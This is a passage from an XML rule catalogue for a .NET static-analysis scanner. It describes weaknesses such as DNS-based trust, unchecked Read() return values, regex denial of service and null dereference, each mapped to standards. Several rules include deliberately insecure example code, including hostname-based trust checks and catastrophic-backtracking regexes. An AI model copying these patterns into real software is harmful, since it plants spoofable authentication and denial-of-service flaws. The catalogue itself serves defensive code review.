							  Many DNS servers are susceptible to spoofing attacks, so you should assume that your software will someday run in an environment with a compromised DNS server. If attackers are allowed to make DNS updates (sometimes called DNS cache poisoning), they can route your network traffic through their machines or make it appear as if their IP addresses are part of your domain. Do not base the security of your system on DNS names.<br><br><br><b>Example:</b> The following code sample uses a DNS lookup in order to decide whether or not an inbound request is from a trusted host. If an attacker can poison the DNS cache, they can gain trusted status.<br><br><pre><br> IPAddress hostIPAddress = IPAddress.Parse(RemoteIpAddress);<br> IPHostEntry hostInfo = Dns.GetHostByAddress(hostIPAddress);<br> if (hostInfo.HostName.EndsWith("trustme.com")) {<br>   trusted = true;<br> }<br></pre><br><br>IP addresses are more reliable than DNS names, but they can also be spoofed. Attackers can easily forge the source IP address of the packets they send, but response packets will return to the forged IP address. To see the response packets, the attacker has to sniff the traffic between the victim machine and the forged IP address. In order to accomplish the required sniffing, attackers typically attempt to locate themselves on the same subnet as the victim machine. Attackers may be able to circumvent this requirement by using source routing, but source routing is disabled across much of the Internet today. In summary, IP address verification can be a useful part of an authentication scheme, but it should not be the single factor required for authentication.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A2 Broken Authentication and Session Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A3 Broken Authentication and Session Management</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A3 Broken Authentication and Session Management</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A7 Broken Authentication and Session Management</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3460 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3460 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3460 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3460 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3460 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 247, CWE ID 292, CWE ID 558, CWE ID 807</em> <br></p>
																									   <p>[11] Standards Mapping - FIPS200 - (FISMA) <em>IA</em> <br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[14] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 807</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 807</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.3</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[20] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-23 Session Authenticity (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>api-abuse</tag>
  </rule>
  <rule>
    <key>api_abuse_unchecked_return_value</key>
    <internalKey>API Abuse/Unchecked Return Value</internalKey>
    <name>Unchecked Return Value</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Ignoring a method's return value can cause the program to overlook unexpected states and conditions.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  It is not uncommon for programmers to misunderstand <code>Read()</code> and related methods that are part of many <code>System.IO</code> classes. Most errors and unusual events in .NET result in an exception being thrown. (This is one of the advantages that .NET has over languages like C: Exceptions make it easier for programmers to think about what can go wrong.)  But the stream and reader classes do not consider it to be unusual or exceptional if only a small amount of data becomes available. These classes simply add the small amount of data to the return buffer, and set the return value to the number of bytes or characters read. There is no guarantee that the amount of data returned is equal to the amount of data requested.<br><br>This behavior makes it important for programmers to examine the return value from <code>Read()</code> and other IO methods and ensure that they receive the amount of data they expect.<br><br><b>Example:</b> The following code loops through a set of users, reading a private data file for each user. The programmer assumes that the files are always 1 kilobyte in size and therefore ignores the return value from <code>Read()</code>. If an attacker can create a smaller file, the program will recycle the remainder of the data from the previous user and handle it as though it belongs to the attacker.<br><br><pre><br>char[] byteArray = new char[1024];<br>for (IEnumerator i=users.GetEnumerator(); i.MoveNext() ;i.Current()) {<br>    string userName = (string) i.Current();<br>    string pFileName = PFILE_ROOT + "/" + userName;<br>    StreamReader sr = new StreamReader(pFileName);<br>    sr.Read(byteArray,0,1024);//the file is always 1k bytes<br>    sr.Close();<br>    processPFile(userName, byteArray);<br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A7 Improper Error Handling</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3120 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3120 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3120 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3120 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3120 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 252, CWE ID 754</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.2, Requirement 6.5.6</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[13] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Risky Resource Management - CWE ID 754</em> <br></p>
																									   <p>[14] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-11 Error Handling (P2)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>api-abuse</tag>
  </rule>
  <rule>
    <key>code_quality_asp_net_bad_practices_unminified_code</key>
    <internalKey>Code Quality/ASP.NET Bad Practices/Unminified Code</internalKey>
    <name>ASP.NET Bad Practices: Unminified Code</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Unminified JavaScript has been included in this file.  Microsoft recommends that minified versions of JavaScript libraries should be included for performance reasons.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Minification improves page load times for applications that include JavaScript files by reducing the file size. Minification refers to the process of removing unnecessary whitespace, comments, semicolons, braces, shortening the names of local variables and removing unreachable code.<br><br><b>Example 1:</b> The following ASPX code includes the unminified version of Microsoft's jQuery library:<br><br><pre><br>...<br>&lt;script src="http://applicationserver.application.com/lib/jquery/jquery-1.4.2.js" type="text/javascript"&gt;&lt;/script&gt;<br>...<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A3 Malicious File Execution</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 94</em> <br></p>
																									   <p>[11]  <em>Introduction to CSS Minification</em> Microsoft<br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[13]  <em>Microsoft AJAX Minifier</em> Microsoft<br></p>
																									   <p>[14]  <em>Optimizations for Improving Load Times</em> Microsoft<br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[16] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Risky Resource Management - CWE ID 094</em> <br></p>
																									   <p>[17] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Risky Resource Management - CWE ID 098</em> <br></p>
																									   <p>[18] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>code-quality</tag>
  </rule>
  <rule>
    <key>code_quality_code_correctness_class_implements_icloneable</key>
    <internalKey>Code Quality/Code Correctness/Class Implements ICloneable</internalKey>
    <name>Code Correctness: Class Implements ICloneable</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The <code>ICloneable</code> interface specifies a weak contract for its <code>Clone</code> method and should be avoided.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The <code>ICloneable</code> interface does not guarantee deep cloning, classes that implement it may not behave as expected when they are cloned. Classes that implement <code>ICloneable</code> and perform only shallow-cloning (copies only the object, which includes existing references to other objects) may result in unexpected behavior. Because deep-cloning (copies the object and all referenced objects) is typically the assumed behavior of a clone method, the use of the <code>ICloneable</code> interface is error prone and should be avoided.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 398</em> <br></p>
																									   <p>[2] Krzysztof Cwalina, Brad Abrams <em>Framework Design Guidelines: Conventions, Idioms, and Patterns for Reusable .NET Libraries. Chapter 8: Usage Guidelines</em> Addison-Wesley<br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>code-quality</tag>
  </rule>
  <rule>
    <key>code_quality_code_correctness_erroneous_class_compare</key>
    <internalKey>Code Quality/Code Correctness/Erroneous Class Compare</internalKey>
    <name>Code Correctness: Erroneous Class Compare</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Determining an object's type based on its class name can lead to unexpected behavior or allow an attacker to inject a malicious class.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Attackers may deliberately duplicate class names in order to cause a program to execute malicious code. For this reason, class names are not good type identifiers and should not be used as the basis for granting trust to a given object.<br><br>Example 1: The following code opts to trust or distrust input from an <code>inputReader</code> object based on its class name. If an attacker is able to supply an implementation of <code>inputReader</code> that executes malicious commands, this code will be unable to differentiate the benign and malicious versions of the object.<br><br><pre><br>if (inputReader.GetType().FullName == "CompanyX.Transaction.Monetary")<br>{<br>   processTransaction(inputReader);<br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 486</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>code-quality</tag>
  </rule>
  <rule>
    <key>code_quality_code_correctness_misleading_method_signature</key>
    <internalKey>Code Quality/Code Correctness/Misleading Method Signature</internalKey>
    <name>Code Correctness: Misleading Method Signature</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  This looks like an effort to override a common .NET method, but it probably does not have the intended effect.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  This method's name is similar to a common .NET method name, but it is either spelled incorrectly or the argument list causes it to not override the intended method.<br><br><b>Example 1:</b> The following method is meant to override <code>System.Object.Equals()</code>:<br><br><pre><br>public boolean Equals(string obj) {<br>  ...<br>}<br></pre><br><br>But since <code>System.Object.Equals()</code> takes an argument of type <code>object</code>, the method above is never called.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 398</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>code-quality</tag>
  </rule>
  <rule>
    <key>code_quality_code_correctness_missing__serializable__attribute</key>
    <internalKey>Code Quality/Code Correctness/Missing [Serializable] Attribute</internalKey>
    <name>Code Correctness: Missing [Serializable] Attribute</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Classes that implement the <code>ISerializable</code> interface but do not declare the <code>[Serializable]</code> attribute will not be serialized.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The .NET runtime will permit the serialization of any object that declares the <code>[Serializable]</code> attribute. If the class can be serialized using the default serialization methods defined by the .NET framework, this is both necessary and sufficient for the object to be correctly serialized. If the class requires custom serialization methods, it must also implement the <code>ISerializable</code> interface. However, the class must still declare the <code>[Serializable]</code> attribute.<br><br><b>Example 1:</b> The <code>CustomStorage</code> class implements the <code>ISerializable</code> interface. However, because it fails to declare the <code>[Serializable]</code> attribute, it will not be serialized.<br><br><pre><br>public class CustomStorage: ISerializable {<br>	...<br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A9 Application Denial of Service</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP6080 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP6080 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP6080 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP6080 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP6080 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 730</em> <br></p>
																									   <p>[8]  <em>Mark ISerializable types with Serializable</em> Microsoft Corporation<br></p>
																									   <p>[9] Piet Obermeyer and Jonathan Hawkins <em>MSDN Library: Object Serialization in the .NET Framework</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[11] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-5 Denial of Service Protection (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>code-quality</tag>
  </rule>
  <rule>
    <key>code_quality_code_correctness_regular_expressions_denial_of_service</key>
    <internalKey>Code Quality/Code Correctness/Regular Expressions Denial of Service</internalKey>
    <name>Code Correctness: Regular Expressions Denial of Service</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Untrusted data is passed to the application and used as a regular expression.  This can cause the thread to over-consume CPU resources.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  There is a vulnerability in implementations of regular expression evaluators and related methods that can cause the thread to hang when evaluating repeating and alternating overlapping of nested and repeated regex groups. This defect can be used to execute a DOS (Denial of Service) attack.<br>		<b>Example:</b><br>		<pre><br>		(e+)+<br>		([a-zA-Z]+)*<br>		(e|ee)+<br>		</pre><br>		There are no known regular expression implementations which are immune to this vulnerability.  All platforms and languages are vulnerable to this attack.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A9 Application Denial of Service</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP6080 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP6080 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP6080 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP6080 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP6080 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 185, CWE ID 730</em> <br></p>
																									   <p>[8] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Denial of Service</em> <br></p>
																									   <p>[9] Bryan Sullivan <em>Regular Expression Denial of Service Attacks and Defenses</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[12] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-5 Denial of Service Protection (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>code-quality</tag>
  </rule>
  <rule>
    <key>code_quality_code_correctness_null_argument_to_equals_</key>
    <internalKey>Code Quality/Code Correctness/null Argument to Equals()</internalKey>
    <name>Code Correctness: null Argument to Equals()</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The expression <code>obj.Equals(null)</code> should always be false.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The program uses the <code>Equals()</code> method to compare an object with <code>null</code>. The contract of the <code>Equals()</code> method requires this comparison to always return false.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 398, CWE ID 754</em> <br></p>
																									   <p>[2] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Risky Resource Management - CWE ID 754</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>code-quality</tag>
  </rule>
  <rule>
    <key>code_quality_dead_code_unused_field</key>
    <internalKey>Code Quality/Dead Code/Unused Field</internalKey>
    <name>Dead Code: Unused Field</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  This field is never used directly or indirectly by a public method.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  This field is never accessed, except perhaps by dead code. Dead code is defined as code that is never directly or indirectly executed by a public method. It is likely that the field is simply vestigial, but it is also possible that the unused field points out a bug.<br><br><b>Example 1:</b> The field named <code>glue</code> is not used in the following class. The author of the class has accidentally put quotes around the field name, transforming it into a string constant.<br><br><pre><br>public class Dead {<br><br>  string glue;<br><br>  public string GetGlue() {<br>    return "glue";<br>  }<br><br>}<br></pre><br><br><b>Example 2:</b> The field named <code>glue</code> is used in the following class, but only from a method that is never called by a public method.<br><br><pre><br>public class Dead {<br><br>  string glue;<br><br>  private string GetGlue() {<br>    return glue;<br>  }<br><br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3050 CAT II</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3050 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3050 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3050 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3050 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 561</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>code-quality</tag>
  </rule>
  <rule>
    <key>code_quality_dead_code_unused_method</key>
    <internalKey>Code Quality/Dead Code/Unused Method</internalKey>
    <name>Dead Code: Unused Method</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  This method is not reachable from any method outside the class.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  This method is never called or is only called from other dead code. Dead code is defined as code that is never directly or indirectly executed by a public method.<br><br><b>Example 1:</b> In the following class, the method <code>DoWork()</code> can never be called.<br><br><pre><br>public class Dead {<br>  private void DoWork() {<br>    Console.Write("doing work");<br>  }<br>  public static void Main(string[] args) {<br>    Console.Write("running Dead");<br>  }<br>}<br></pre><br><br><b>Example 2:</b> In the following class, two private methods call each other, but since neither one is ever invoked from anywhere else, they are both dead code.<br><br><pre><br>public class DoubleDead {<br>  private void DoTweedledee() {<br>    DoTweedledumb();<br>  }<br>  private void DoTweedledumb() {<br>    DoTweedledee();<br>  }<br>  public static void Main(string[] args) {<br>    Console.Write("running DoubleDead");<br>  }<br>}<br></pre><br><br>(In this case it is a good thing that the methods are dead: invoking either one would cause an infinite loop.)
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3050 CAT II</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3050 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3050 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3050 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3050 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 561</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>code-quality</tag>
  </rule>
  <rule>
    <key>code_quality_null_dereference</key>
    <internalKey>Code Quality/Null Dereference</internalKey>
    <name>Null Dereference</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program can potentially dereference a null pointer, thereby raising a <code>NullException</code>.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Null pointer errors are usually the result of one or more programmer assumptions being violated.<br><br>Most null pointer issues result in general software reliability problems, but if an attacker can intentionally trigger a null pointer dereference, the attacker may be able to use the resulting exception to bypass security logic or to cause the application to reveal debugging information that will be valuable in planning subsequent attacks.<br><br><b>Example 1:</b> In the following code, the programmer assumes that the system always has a property named "<code>cmd</code>" defined. If an attacker can control the program's environment so that "<code>cmd</code>" is not defined, the program throws a null pointer exception when it attempts to call the <code>Trim()</code> method.<br><br><pre><br>string cmd = null;<br>...<br>cmd = Environment.GetEnvironmentVariable("cmd");<br>cmd = cmd.Trim();<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A9 Application Denial of Service</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP6080 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP6080 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP6080 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP6080 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP6080 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 476</em> <br></p>
																									   <p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[10] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-5 Denial of Service Protection (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>code-quality</tag>
  </rule>
  <rule>
    <key>code_quality_obsolete</key>
    <internalKey>Code Quality/Obsolete</internalKey>
    <name>Obsolete</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The use of deprecated or obsolete functions could indicate neglected code.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  As programming languages evolve, functions occasionally become obsolete due to:<br><br>	- Advances in the language<br><br>	- Improved understanding of how operations should perform effectively and<br>	 securely<br><br>	- Changes in the conventions that govern certain operations<br><br> Functions that are removed from a language are usually replaced by newer counterparts that perform the same task in some different and hopefully better way.<br><br><b>Example:</b> The following code constructs a new <code>SqlClientPermission</code> object, which regulates how users are allowed to connect to a database. In this example, the program passes <code>false</code> as the second parameter to the constructor, which controls whether users are allowed to connect with blank passwords. Passing false to this parameter indicates that blank passwords should not be allowed.<br><br><pre><br>...<br>SCP = new SqlClientPermission(pstate, false);<br>...<br></pre><br><br>However, because the <code>PermissionState</code> object passed as the first parameter supersedes any value passed to the second parameter, the constructor allows blank passwords for database connections, which contradicts the second argument. To disallow blank passwords, the program should pass <code>PermissionState.None</code> to the first parameter of the constructor. Because of the ambiguity in its functionality, the two-parameter version of the <code>SqlClientPermission</code> constructor has been deprecated in favor of the single parameter version, which conveys the same degree of information without the risk of misinterpretation.<br><br>Not all functions are deprecated or replaced because they pose a security risk. However, the presence of an obsolete function often indicates that the surrounding code has been neglected and may be in a state of disrepair. Software security has not been a priority, or even a consideration, for very long. If the program uses deprecated or obsolete functions, it raises the probability that there are security problems lurking nearby.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 477</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>code-quality</tag>
  </rule>
  <rule>
    <key>code_quality_portability_flaw_file_separator</key>
    <internalKey>Code Quality/Portability Flaw/File Separator</internalKey>
    <name>Portability Flaw: File Separator</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The use of hardcoded file separators causes portability problems.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Different operating systems use different characters as file separators. For example, Microsoft Windows systems use "\", while UNIX systems use "/". When applications have to run on different platforms, the use of hardcoded file separators can lead to incorrect execution of application logic and potentially a denial of service.<br><br><br><br><b>Example 1:</b> The following code uses a hardcoded file separator to open a file:<br><br><pre><br>...<br>FileStream f = File.Create(directoryName + "\\" + fileName);<br>...<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 474</em> <br></p>
																									   <p>[2] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.6</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>code-quality</tag>
  </rule>
  <rule>
    <key>code_quality_unreleased_resource</key>
    <internalKey>Code Quality/Unreleased Resource</internalKey>
    <name>Unreleased Resource</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program can potentially fail to release a system resource.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The program can potentially fail to release a system resource.<br><br>Resource leaks have at least two common causes:<br><br>- Error conditions and other exceptional circumstances.<br><br>- Confusion over which part of the program is responsible for releasing the resource.<br><br>Most unreleased resource issues result in general software reliability problems, but if an attacker can intentionally trigger a resource leak, the attacker may be able to launch a denial of service attack by depleting the resource pool.<br><br><b>Example 1:</b> The following method never closes the file handle it opens. The <code>Finalize()</code> method for <code>StreamReader</code> eventually calls <code>Close()</code>, but there is no guarantee as to how long it will take before the <code>Finalize()</code> method is invoked. In fact, there is no guarantee that <code>Finalize()</code> will ever be invoked. In a busy environment, this can result in the VM using up all of its available file handles.<br><br><pre><br>private void processFile(string fName) {<br>	StreamWriter sw = new StreamWriter(fName);<br>	string line;<br>	while ((line = sr.ReadLine()) != null)<br>		processLine(line);<br>}<br></pre><br><br><b>Example 